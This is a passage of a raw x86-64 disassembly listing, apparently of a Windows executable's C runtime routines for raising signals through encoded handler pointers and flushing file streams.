   14000a347:	cc                   	int3
   14000a348:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a34d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000a352:	57                   	push   %rdi
   14000a353:	48 83 ec 20          	sub    $0x20,%rsp
   14000a357:	49 8b f9             	mov    %r9,%rdi
   14000a35a:	8b 0a                	mov    (%rdx),%ecx
   14000a35c:	e8 0b e9 ff ff       	call   0x140008c6c
   14000a361:	90                   	nop
   14000a362:	48 8b 05 97 fc 00 00 	mov    0xfc97(%rip),%rax        # 0x14001a000
   14000a369:	8b c8                	mov    %eax,%ecx
   14000a36b:	83 e1 3f             	and    $0x3f,%ecx
   14000a36e:	48 8b 1d 9b 18 01 00 	mov    0x1189b(%rip),%rbx        # 0x14001bc10
   14000a375:	48 33 d8             	xor    %rax,%rbx
   14000a378:	48 d3 cb             	ror    %cl,%rbx
   14000a37b:	8b 0f                	mov    (%rdi),%ecx
   14000a37d:	e8 3e e9 ff ff       	call   0x140008cc0
   14000a382:	48 8b c3             	mov    %rbx,%rax
   14000a385:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a38a:	48 83 c4 20          	add    $0x20,%rsp
   14000a38e:	5f                   	pop    %rdi
   14000a38f:	c3                   	ret
   14000a390:	4c 8b dc             	mov    %rsp,%r11
   14000a393:	48 83 ec 28          	sub    $0x28,%rsp
   14000a397:	b8 03 00 00 00       	mov    $0x3,%eax
   14000a39c:	4d 8d 4b 10          	lea    0x10(%r11),%r9
   14000a3a0:	4d 8d 43 08          	lea    0x8(%r11),%r8
   14000a3a4:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000a3a8:	49 8d 53 18          	lea    0x18(%r11),%rdx
   14000a3ac:	89 44 24 40          	mov    %eax,0x40(%rsp)
   14000a3b0:	49 8d 4b 08          	lea    0x8(%r11),%rcx
   14000a3b4:	e8 8f ff ff ff       	call   0x14000a348
   14000a3b9:	48 83 c4 28          	add    $0x28,%rsp
   14000a3bd:	c3                   	ret
   14000a3be:	cc                   	int3
   14000a3bf:	cc                   	int3
   14000a3c0:	48 89 0d 39 18 01 00 	mov    %rcx,0x11839(%rip)        # 0x14001bc00
   14000a3c7:	48 89 0d 3a 18 01 00 	mov    %rcx,0x1183a(%rip)        # 0x14001bc08
   14000a3ce:	48 89 0d 3b 18 01 00 	mov    %rcx,0x1183b(%rip)        # 0x14001bc10
   14000a3d5:	48 89 0d 3c 18 01 00 	mov    %rcx,0x1183c(%rip)        # 0x14001bc18
   14000a3dc:	c3                   	ret
   14000a3dd:	cc                   	int3
   14000a3de:	cc                   	int3
   14000a3df:	cc                   	int3
   14000a3e0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000a3e5:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000a3ea:	57                   	push   %rdi
   14000a3eb:	41 54                	push   %r12
   14000a3ed:	41 55                	push   %r13
   14000a3ef:	41 56                	push   %r14
   14000a3f1:	41 57                	push   %r15
   14000a3f3:	48 83 ec 40          	sub    $0x40,%rsp
   14000a3f7:	8b d9                	mov    %ecx,%ebx
   14000a3f9:	45 33 ff             	xor    %r15d,%r15d
   14000a3fc:	44 21 7c 24 78       	and    %r15d,0x78(%rsp)
   14000a401:	41 b6 01             	mov    $0x1,%r14b
   14000a404:	44 88 74 24 70       	mov    %r14b,0x70(%rsp)
   14000a409:	8b d1                	mov    %ecx,%edx
   14000a40b:	83 ea 02             	sub    $0x2,%edx
   14000a40e:	74 27                	je     0x14000a437
   14000a410:	83 ea 02             	sub    $0x2,%edx
   14000a413:	74 52                	je     0x14000a467
   14000a415:	83 ea 02             	sub    $0x2,%edx
   14000a418:	74 1d                	je     0x14000a437
   14000a41a:	83 ea 02             	sub    $0x2,%edx
   14000a41d:	74 48                	je     0x14000a467
   14000a41f:	83 ea 03             	sub    $0x3,%edx
   14000a422:	74 43                	je     0x14000a467
   14000a424:	83 ea 04             	sub    $0x4,%edx
   14000a427:	74 0e                	je     0x14000a437
   14000a429:	83 ea 06             	sub    $0x6,%edx
   14000a42c:	74 09                	je     0x14000a437
   14000a42e:	83 fa 01             	cmp    $0x1,%edx
   14000a431:	0f 85 82 00 00 00    	jne    0x14000a4b9
   14000a437:	83 e9 02             	sub    $0x2,%ecx
   14000a43a:	0f 84 b4 00 00 00    	je     0x14000a4f4
   14000a440:	83 e9 04             	sub    $0x4,%ecx
   14000a443:	0f 84 90 00 00 00    	je     0x14000a4d9
   14000a449:	83 e9 09             	sub    $0x9,%ecx
   14000a44c:	0f 84 99 00 00 00    	je     0x14000a4eb
   14000a452:	83 e9 06             	sub    $0x6,%ecx
   14000a455:	0f 84 87 00 00 00    	je     0x14000a4e2
   14000a45b:	83 f9 01             	cmp    $0x1,%ecx
   14000a45e:	74 79                	je     0x14000a4d9
   14000a460:	33 ff                	xor    %edi,%edi
   14000a462:	e9 94 00 00 00       	jmp    0x14000a4fb
   14000a467:	e8 a0 c0 ff ff       	call   0x14000650c
   14000a46c:	4c 8b f8             	mov    %rax,%r15
   14000a46f:	48 85 c0             	test   %rax,%rax
   14000a472:	75 1d                	jne    0x14000a491
   14000a474:	83 c8 ff             	or     $0xffffffff,%eax
   14000a477:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   14000a47c:	49 8b 5b 40          	mov    0x40(%r11),%rbx
   14000a480:	49 8b 73 48          	mov    0x48(%r11),%rsi
   14000a484:	49 8b e3             	mov    %r11,%rsp
   14000a487:	41 5f                	pop    %r15
   14000a489:	41 5e                	pop    %r14
   14000a48b:	41 5d                	pop    %r13
   14000a48d:	41 5c                	pop    %r12
   14000a48f:	5f                   	pop    %rdi
   14000a490:	c3                   	ret
   14000a491:	48 8b 00             	mov    (%rax),%rax
   14000a494:	48 8b 0d d5 6f 00 00 	mov    0x6fd5(%rip),%rcx        # 0x140011470
   14000a49b:	48 c1 e1 04          	shl    $0x4,%rcx
   14000a49f:	48 03 c8             	add    %rax,%rcx
   14000a4a2:	eb 09                	jmp    0x14000a4ad
   14000a4a4:	39 58 04             	cmp    %ebx,0x4(%rax)
   14000a4a7:	74 0b                	je     0x14000a4b4
   14000a4a9:	48 83 c0 10          	add    $0x10,%rax
   14000a4ad:	48 3b c1             	cmp    %rcx,%rax
   14000a4b0:	75 f2                	jne    0x14000a4a4
   14000a4b2:	33 c0                	xor    %eax,%eax
   14000a4b4:	48 85 c0             	test   %rax,%rax
   14000a4b7:	75 12                	jne    0x14000a4cb
   14000a4b9:	e8 f6 c6 ff ff       	call   0x140006bb4
   14000a4be:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000a4c4:	e8 af c5 ff ff       	call   0x140006a78
   14000a4c9:	eb a9                	jmp    0x14000a474
   14000a4cb:	48 8d 78 08          	lea    0x8(%rax),%rdi
   14000a4cf:	45 32 f6             	xor    %r14b,%r14b
   14000a4d2:	44 88 74 24 70       	mov    %r14b,0x70(%rsp)
   14000a4d7:	eb 22                	jmp    0x14000a4fb
   14000a4d9:	48 8d 3d 30 17 01 00 	lea    0x11730(%rip),%rdi        # 0x14001bc10
   14000a4e0:	eb 19                	jmp    0x14000a4fb
   14000a4e2:	48 8d 3d 1f 17 01 00 	lea    0x1171f(%rip),%rdi        # 0x14001bc08
   14000a4e9:	eb 10                	jmp    0x14000a4fb
   14000a4eb:	48 8d 3d 26 17 01 00 	lea    0x11726(%rip),%rdi        # 0x14001bc18
   14000a4f2:	eb 07                	jmp    0x14000a4fb
   14000a4f4:	48 8d 3d 05 17 01 00 	lea    0x11705(%rip),%rdi        # 0x14001bc00
   14000a4fb:	45 33 ed             	xor    %r13d,%r13d
   14000a4fe:	45 84 f6             	test   %r14b,%r14b
   14000a501:	74 0a                	je     0x14000a50d
   14000a503:	41 8d 4d 03          	lea    0x3(%r13),%ecx
   14000a507:	e8 60 e7 ff ff       	call   0x140008c6c
   14000a50c:	90                   	nop
   14000a50d:	48 8b 37             	mov    (%rdi),%rsi
   14000a510:	45 84 f6             	test   %r14b,%r14b
   14000a513:	74 12                	je     0x14000a527
   14000a515:	48 8b 05 e4 fa 00 00 	mov    0xfae4(%rip),%rax        # 0x14001a000
   14000a51c:	8b c8                	mov    %eax,%ecx
   14000a51e:	83 e1 3f             	and    $0x3f,%ecx
   14000a521:	48 33 f0             	xor    %rax,%rsi
   14000a524:	48 d3 ce             	ror    %cl,%rsi
   14000a527:	48 83 fe 01          	cmp    $0x1,%rsi
   14000a52b:	0f 84 8b 00 00 00    	je     0x14000a5bc
   14000a531:	48 85 f6             	test   %rsi,%rsi
   14000a534:	0f 84 06 01 00 00    	je     0x14000a640
   14000a53a:	41 bc 10 09 00 00    	mov    $0x910,%r12d
   14000a540:	83 fb 0b             	cmp    $0xb,%ebx
   14000a543:	77 35                	ja     0x14000a57a
   14000a545:	41 0f a3 dc          	bt     %ebx,%r12d
   14000a549:	73 2f                	jae    0x14000a57a
   14000a54b:	4d 8b 6f 08          	mov    0x8(%r15),%r13
   14000a54f:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   14000a554:	49 83 67 08 00       	andq   $0x0,0x8(%r15)
   14000a559:	83 fb 08             	cmp    $0x8,%ebx
   14000a55c:	75 52                	jne    0x14000a5b0
   14000a55e:	e8 31 be ff ff       	call   0x140006394
   14000a563:	8b 40 10             	mov    0x10(%rax),%eax
   14000a566:	89 44 24 78          	mov    %eax,0x78(%rsp)
   14000a56a:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000a56e:	e8 21 be ff ff       	call   0x140006394
   14000a573:	c7 40 10 8c 00 00 00 	movl   $0x8c,0x10(%rax)
   14000a57a:	83 fb 08             	cmp    $0x8,%ebx
   14000a57d:	75 31                	jne    0x14000a5b0
   14000a57f:	48 8b 05 f2 6e 00 00 	mov    0x6ef2(%rip),%rax        # 0x140011478
   14000a586:	48 c1 e0 04          	shl    $0x4,%rax
   14000a58a:	49 03 07             	add    (%r15),%rax
   14000a58d:	48 8b 0d ec 6e 00 00 	mov    0x6eec(%rip),%rcx        # 0x140011480
   14000a594:	48 c1 e1 04          	shl    $0x4,%rcx
   14000a598:	48 03 c8             	add    %rax,%rcx
   14000a59b:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000a5a0:	48 3b c1             	cmp    %rcx,%rax
   14000a5a3:	74 1d                	je     0x14000a5c2
   14000a5a5:	48 83 60 08 00       	andq   $0x0,0x8(%rax)
   14000a5aa:	48 83 c0 10          	add    $0x10,%rax
   14000a5ae:	eb eb                	jmp    0x14000a59b
   14000a5b0:	48 8b 05 49 fa 00 00 	mov    0xfa49(%rip),%rax        # 0x14001a000
   14000a5b7:	48 89 07             	mov    %rax,(%rdi)
   14000a5ba:	eb 06                	jmp    0x14000a5c2
   14000a5bc:	41 bc 10 09 00 00    	mov    $0x910,%r12d
   14000a5c2:	45 84 f6             	test   %r14b,%r14b
   14000a5c5:	74 0a                	je     0x14000a5d1
   14000a5c7:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000a5cc:	e8 ef e6 ff ff       	call   0x140008cc0
   14000a5d1:	48 83 fe 01          	cmp    $0x1,%rsi
   14000a5d5:	75 07                	jne    0x14000a5de
   14000a5d7:	33 c0                	xor    %eax,%eax
   14000a5d9:	e9 99 fe ff ff       	jmp    0x14000a477
   14000a5de:	83 fb 08             	cmp    $0x8,%ebx
   14000a5e1:	75 23                	jne    0x14000a606
   14000a5e3:	e8 ac bd ff ff       	call   0x140006394
   14000a5e8:	49 ba 70 33 d3 30 4f 	movabs $0x8b9c1f4f30d33370,%r10
   14000a5ef:	1f 9c 8b 
   14000a5f2:	8b 50 10             	mov    0x10(%rax),%edx
   14000a5f5:	8b cb                	mov    %ebx,%ecx
   14000a5f7:	48 8b c6             	mov    %rsi,%rax
   14000a5fa:	4c 8b 05 bf 5c 00 00 	mov    0x5cbf(%rip),%r8        # 0x1400102c0
   14000a601:	41 ff d0             	call   *%r8
   14000a604:	eb 18                	jmp    0x14000a61e
   14000a606:	49 ba 70 73 d7 50 49 	movabs $0xc6c1864950d77370,%r10
   14000a60d:	86 c1 c6 
   14000a610:	8b cb                	mov    %ebx,%ecx
   14000a612:	48 8b c6             	mov    %rsi,%rax
   14000a615:	48 8b 15 a4 5c 00 00 	mov    0x5ca4(%rip),%rdx        # 0x1400102c0
   14000a61c:	ff d2                	call   *%rdx
   14000a61e:	83 fb 0b             	cmp    $0xb,%ebx
   14000a621:	77 b4                	ja     0x14000a5d7
   14000a623:	41 0f a3 dc          	bt     %ebx,%r12d
   14000a627:	73 ae                	jae    0x14000a5d7
   14000a629:	4d 89 6f 08          	mov    %r13,0x8(%r15)
   14000a62d:	83 fb 08             	cmp    $0x8,%ebx
   14000a630:	75 a5                	jne    0x14000a5d7
   14000a632:	e8 5d bd ff ff       	call   0x140006394
   14000a637:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   14000a63b:	89 48 10             	mov    %ecx,0x10(%rax)
   14000a63e:	eb 97                	jmp    0x14000a5d7
   14000a640:	45 84 f6             	test   %r14b,%r14b
   14000a643:	74 08                	je     0x14000a64d
   14000a645:	8d 4e 03             	lea    0x3(%rsi),%ecx
   14000a648:	e8 73 e6 ff ff       	call   0x140008cc0
   14000a64d:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000a652:	e8 69 af ff ff       	call   0x1400055c0
   14000a657:	90                   	nop
   14000a658:	cc                   	int3
   14000a659:	cc                   	int3
   14000a65a:	cc                   	int3
   14000a65b:	cc                   	int3
   14000a65c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a661:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000a666:	57                   	push   %rdi
   14000a667:	48 83 ec 20          	sub    $0x20,%rsp
   14000a66b:	49 8b f9             	mov    %r9,%rdi
   14000a66e:	49 8b d8             	mov    %r8,%rbx
   14000a671:	48 8b 0a             	mov    (%rdx),%rcx
   14000a674:	e8 a7 04 00 00       	call   0x14000ab20
   14000a679:	90                   	nop
   14000a67a:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   14000a67e:	48 8b 03             	mov    (%rbx),%rax
   14000a681:	48 8b 08             	mov    (%rax),%rcx
   14000a684:	48 85 c9             	test   %rcx,%rcx
   14000a687:	74 5c                	je     0x14000a6e5
   14000a689:	8b 49 14             	mov    0x14(%rcx),%ecx
   14000a68c:	90                   	nop
   14000a68d:	8b c1                	mov    %ecx,%eax
   14000a68f:	c1 e8 0d             	shr    $0xd,%eax
   14000a692:	24 01                	and    $0x1,%al
   14000a694:	74 4f                	je     0x14000a6e5
   14000a696:	8b c1                	mov    %ecx,%eax
   14000a698:	24 03                	and    $0x3,%al
   14000a69a:	3c 02                	cmp    $0x2,%al
   14000a69c:	75 05                	jne    0x14000a6a3
   14000a69e:	f6 c1 c0             	test   $0xc0,%cl
   14000a6a1:	75 0a                	jne    0x14000a6ad
   14000a6a3:	0f ba e1 0b          	bt     $0xb,%ecx
   14000a6a7:	72 04                	jb     0x14000a6ad
   14000a6a9:	ff 02                	incl   (%rdx)
   14000a6ab:	eb 38                	jmp    0x14000a6e5
   14000a6ad:	48 8b 43 10          	mov    0x10(%rbx),%rax
   14000a6b1:	80 38 00             	cmpb   $0x0,(%rax)
   14000a6b4:	75 10                	jne    0x14000a6c6
   14000a6b6:	48 8b 03             	mov    (%rbx),%rax
   14000a6b9:	48 8b 08             	mov    (%rax),%rcx
   14000a6bc:	8b 41 14             	mov    0x14(%rcx),%eax
   14000a6bf:	90                   	nop
   14000a6c0:	d1 e8                	shr    $1,%eax
   14000a6c2:	24 01                	and    $0x1,%al
   14000a6c4:	74 1f                	je     0x14000a6e5
   14000a6c6:	48 8b 0b             	mov    (%rbx),%rcx
   14000a6c9:	48 8b 09             	mov    (%rcx),%rcx
   14000a6cc:	e8 f7 01 00 00       	call   0x14000a8c8
   14000a6d1:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000a6d4:	74 08                	je     0x14000a6de
   14000a6d6:	48 8b 43 08          	mov    0x8(%rbx),%rax
   14000a6da:	ff 00                	incl   (%rax)
   14000a6dc:	eb 07                	jmp    0x14000a6e5
   14000a6de:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000a6e2:	83 08 ff             	orl    $0xffffffff,(%rax)
   14000a6e5:	48 8b 0f             	mov    (%rdi),%rcx
   14000a6e8:	e8 3f 04 00 00       	call   0x14000ab2c
   14000a6ed:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a6f2:	48 83 c4 20          	add    $0x20,%rsp
   14000a6f6:	5f                   	pop    %rdi
   14000a6f7:	c3                   	ret
   14000a6f8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a6fd:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000a702:	56                   	push   %rsi
   14000a703:	57                   	push   %rdi
   14000a704:	41 56                	push   %r14
   14000a706:	48 83 ec 60          	sub    $0x60,%rsp
   14000a70a:	49 8b f9             	mov    %r9,%rdi
   14000a70d:	49 8b f0             	mov    %r8,%rsi
   14000a710:	8b 0a                	mov    (%rdx),%ecx
   14000a712:	e8 55 e5 ff ff       	call   0x140008c6c
   14000a717:	90                   	nop
   14000a718:	48 8b 1d 09 15 01 00 	mov    0x11509(%rip),%rbx        # 0x14001bc28
   14000a71f:	48 63 05 fa 14 01 00 	movslq 0x114fa(%rip),%rax        # 0x14001bc20
   14000a726:	4c 8d 34 c3          	lea    (%rbx,%rax,8),%r14
   14000a72a:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   14000a72f:	49 3b de             	cmp    %r14,%rbx
   14000a732:	0f 84 89 00 00 00    	je     0x14000a7c1
   14000a738:	48 8b 03             	mov    (%rbx),%rax
   14000a73b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000a740:	48 8b 16             	mov    (%rsi),%rdx
   14000a743:	48 85 c0             	test   %rax,%rax
   14000a746:	74 22                	je     0x14000a76a
   14000a748:	8b 48 14             	mov    0x14(%rax),%ecx
   14000a74b:	90                   	nop
   14000a74c:	8b c1                	mov    %ecx,%eax
   14000a74e:	c1 e8 0d             	shr    $0xd,%eax
   14000a751:	24 01                	and    $0x1,%al
   14000a753:	74 15                	je     0x14000a76a
   14000a755:	8b c1                	mov    %ecx,%eax
   14000a757:	24 03                	and    $0x3,%al
   14000a759:	3c 02                	cmp    $0x2,%al
   14000a75b:	75 05                	jne    0x14000a762
   14000a75d:	f6 c1 c0             	test   $0xc0,%cl
   14000a760:	75 0e                	jne    0x14000a770
   14000a762:	0f ba e1 0b          	bt     $0xb,%ecx
   14000a766:	72 08                	jb     0x14000a770
   14000a768:	ff 02                	incl   (%rdx)
   14000a76a:	48 83 c3 08          	add    $0x8,%rbx
   14000a76e:	eb ba                	jmp    0x14000a72a
   14000a770:	48 8b 56 10          	mov    0x10(%rsi),%rdx
   14000a774:	48 8b 4e 08          	mov    0x8(%rsi),%rcx
   14000a778:	48 8b 06             	mov    (%rsi),%rax
   14000a77b:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   14000a780:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   14000a785:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000a78a:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   14000a78f:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   14000a794:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000a799:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000a79e:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000a7a3:	4c 8d 4c 24 28       	lea    0x28(%rsp),%r9
   14000a7a8:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   14000a7ad:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   14000a7b2:	48 8d 8c 24 88 00 00 	lea    0x88(%rsp),%rcx
   14000a7b9:	00 
   14000a7ba:	e8 9d fe ff ff       	call   0x14000a65c
   14000a7bf:	eb a9                	jmp    0x14000a76a
   14000a7c1:	8b 0f                	mov    (%rdi),%ecx
   14000a7c3:	e8 f8 e4 ff ff       	call   0x140008cc0
   14000a7c8:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   14000a7cf:	00 
   14000a7d0:	48 83 c4 60          	add    $0x60,%rsp
   14000a7d4:	41 5e                	pop    %r14
   14000a7d6:	5f                   	pop    %rdi
   14000a7d7:	5e                   	pop    %rsi
   14000a7d8:	c3                   	ret
   14000a7d9:	cc                   	int3
   14000a7da:	cc                   	int3
   14000a7db:	cc                   	int3
   14000a7dc:	88 4c 24 08          	mov    %cl,0x8(%rsp)
   14000a7e0:	55                   	push   %rbp
   14000a7e1:	48 8b ec             	mov    %rsp,%rbp
   14000a7e4:	48 83 ec 40          	sub    $0x40,%rsp
   14000a7e8:	83 65 28 00          	andl   $0x0,0x28(%rbp)
   14000a7ec:	48 8d 45 28          	lea    0x28(%rbp),%rax
   14000a7f0:	83 65 20 00          	andl   $0x0,0x20(%rbp)
   14000a7f4:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   14000a7f8:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   14000a7fc:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   14000a800:	48 8d 45 10          	lea    0x10(%rbp),%rax
   14000a804:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   14000a808:	48 8d 55 e4          	lea    -0x1c(%rbp),%rdx
   14000a80c:	48 8d 45 20          	lea    0x20(%rbp),%rax
   14000a810:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   14000a814:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   14000a818:	b8 08 00 00 00       	mov    $0x8,%eax
   14000a81d:	89 45 e0             	mov    %eax,-0x20(%rbp)
   14000a820:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   14000a823:	e8 d0 fe ff ff       	call   0x14000a6f8
   14000a828:	80 7d 10 00          	cmpb   $0x0,0x10(%rbp)
   14000a82c:	8b 45 20             	mov    0x20(%rbp),%eax
   14000a82f:	0f 45 45 28          	cmovne 0x28(%rbp),%eax
   14000a833:	48 83 c4 40          	add    $0x40,%rsp
   14000a837:	5d                   	pop    %rbp
   14000a838:	c3                   	ret
   14000a839:	cc                   	int3
   14000a83a:	cc                   	int3
   14000a83b:	cc                   	int3
   14000a83c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a841:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000a846:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000a84b:	57                   	push   %rdi
   14000a84c:	48 83 ec 20          	sub    $0x20,%rsp
   14000a850:	48 8b d9             	mov    %rcx,%rbx
   14000a853:	48 8b ea             	mov    %rdx,%rbp
   14000a856:	8b 49 14             	mov    0x14(%rcx),%ecx
   14000a859:	8b c1                	mov    %ecx,%eax
   14000a85b:	24 03                	and    $0x3,%al
   14000a85d:	90                   	nop
   14000a85e:	3c 02                	cmp    $0x2,%al
   14000a860:	75 4f                	jne    0x14000a8b1
   14000a862:	f6 c1 c0             	test   $0xc0,%cl
   14000a865:	74 4a                	je     0x14000a8b1
   14000a867:	8b 3b                	mov    (%rbx),%edi
   14000a869:	2b 7b 08             	sub    0x8(%rbx),%edi
   14000a86c:	83 63 10 00          	andl   $0x0,0x10(%rbx)
   14000a870:	48 8b 73 08          	mov    0x8(%rbx),%rsi
   14000a874:	48 89 33             	mov    %rsi,(%rbx)
   14000a877:	85 ff                	test   %edi,%edi
   14000a879:	7e 36                	jle    0x14000a8b1
   14000a87b:	48 8b cb             	mov    %rbx,%rcx
   14000a87e:	e8 05 05 00 00       	call   0x14000ad88
   14000a883:	4c 8b cd             	mov    %rbp,%r9
   14000a886:	44 8b c7             	mov    %edi,%r8d
   14000a889:	48 8b d6             	mov    %rsi,%rdx
   14000a88c:	8b c8                	mov    %eax,%ecx
   14000a88e:	e8 8d 20 00 00       	call   0x14000c920
   14000a893:	3b f8                	cmp    %eax,%edi
   14000a895:	74 0a                	je     0x14000a8a1
   14000a897:	f0 83 4b 14 10       	lock orl $0x10,0x14(%rbx)
   14000a89c:	83 c8 ff             	or     $0xffffffff,%eax
   14000a89f:	eb 12                	jmp    0x14000a8b3
   14000a8a1:	8b 43 14             	mov    0x14(%rbx),%eax
   14000a8a4:	90                   	nop
   14000a8a5:	c1 e8 02             	shr    $0x2,%eax
   14000a8a8:	a8 01                	test   $0x1,%al
   14000a8aa:	74 05                	je     0x14000a8b1
   14000a8ac:	f0 83 63 14 fd       	lock andl $0xfffffffd,0x14(%rbx)
   14000a8b1:	33 c0                	xor    %eax,%eax
   14000a8b3:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a8b8:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000a8bd:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000a8c2:	48 83 c4 20          	add    $0x20,%rsp
   14000a8c6:	5f                   	pop    %rdi
   14000a8c7:	c3                   	ret
   14000a8c8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a8cd:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   14000a8d2:	55                   	push   %rbp
   14000a8d3:	48 8b ec             	mov    %rsp,%rbp
   14000a8d6:	48 83 ec 60          	sub    $0x60,%rsp
   14000a8da:	48 83 65 c0 00       	andq   $0x0,-0x40(%rbp)
   14000a8df:	48 8b d9             	mov    %rcx,%rbx
   14000a8e2:	83 3d 97 0a 01 00 00 	cmpl   $0x0,0x10a97(%rip)        # 0x14001b380
   14000a8e9:	c6 45 d0 00          	movb   $0x0,-0x30(%rbp)
   14000a8ed:	c6 45 e8 00          	movb   $0x0,-0x18(%rbp)
   14000a8f1:	c6 45 f0 00          	movb   $0x0,-0x10(%rbp)
   14000a8f5:	c6 45 f8 00          	movb   $0x0,-0x8(%rbp)
   14000a8f9:	75 10                	jne    0x14000a90b
   14000a8fb:	0f 10 05 36 fe 00 00 	movups 0xfe36(%rip),%xmm0        # 0x14001a738
   14000a902:	c6 45 e8 01          	movb   $0x1,-0x18(%rbp)
   14000a906:	f3 0f 7f 45 d8       	movdqu %xmm0,-0x28(%rbp)
   14000a90b:	48 85 db             	test   %rbx,%rbx
   14000a90e:	75 0b                	jne    0x14000a91b
   14000a910:	33 c9                	xor    %ecx,%ecx
   14000a912:	e8 c5 fe ff ff       	call   0x14000a7dc
   14000a917:	8b f8                	mov    %eax,%edi
   14000a919:	eb 32                	jmp    0x14000a94d
   14000a91b:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   14000a91f:	e8 18 ff ff ff       	call   0x14000a83c
   14000a924:	85 c0                	test   %eax,%eax
   14000a926:	74 05                	je     0x14000a92d
   14000a928:	83 cf ff             	or     $0xffffffff,%edi
   14000a92b:	eb 20                	jmp    0x14000a94d
   14000a92d:	8b 43 14             	mov    0x14(%rbx),%eax
   14000a930:	90                   	nop
   14000a931:	c1 e8 0b             	shr    $0xb,%eax
   14000a934:	a8 01                	test   $0x1,%al
   14000a936:	74 13                	je     0x14000a94b
   14000a938:	48 8b cb             	mov    %rbx,%rcx
   14000a93b:	e8 48 04 00 00       	call   0x14000ad88
   14000a940:	8b c8                	mov    %eax,%ecx
   14000a942:	e8 3d 17 00 00       	call   0x14000c084
   14000a947:	85 c0                	test   %eax,%eax
   14000a949:	75 dd                	jne    0x14000a928
   14000a94b:	33 ff                	xor    %edi,%edi
   14000a94d:	80 7d e8 02          	cmpb   $0x2,-0x18(%rbp)
   14000a951:	75 0b                	jne    0x14000a95e
   14000a953:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
   14000a957:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000a95e:	80 7d f0 00          	cmpb   $0x0,-0x10(%rbp)
   14000a962:	74 0f                	je     0x14000a973
   14000a964:	8b 5d ec             	mov    -0x14(%rbp),%ebx
   14000a967:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000a96b:	e8 00 b5 ff ff       	call   0x140005e70
   14000a970:	89 58 20             	mov    %ebx,0x20(%rax)
   14000a973:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
   14000a977:	74 0f                	je     0x14000a988
   14000a979:	8b 5d f4             	mov    -0xc(%rbp),%ebx
   14000a97c:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000a980:	e8 eb b4 ff ff       	call   0x140005e70
   14000a985:	89 58 24             	mov    %ebx,0x24(%rax)
   14000a988:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   14000a98d:	8b c7                	mov    %edi,%eax
   14000a98f:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   14000a994:	48 83 c4 60          	add    $0x60,%rsp
   14000a998:	5d                   	pop    %rbp
   14000a999:	c3                   	ret
   14000a99a:	cc                   	int3
   14000a99b:	cc                   	int3
   14000a99c:	b1 01                	mov    $0x1,%cl
   14000a99e:	e9 39 fe ff ff       	jmp    0x14000a7dc
   14000a9a3:	cc                   	int3
   14000a9a4:	48 8b c4             	mov    %rsp,%rax
   14000a9a7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000a9ab:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000a9af:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000a9b3:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000a9b7:	41 56                	push   %r14
   14000a9b9:	48 83 ec 20          	sub    $0x20,%rsp
   14000a9bd:	8b 05 5d 12 01 00    	mov    0x1125d(%rip),%eax        # 0x14001bc20
   14000a9c3:	33 db                	xor    %ebx,%ebx
   14000a9c5:	bf 03 00 00 00       	mov    $0x3,%edi
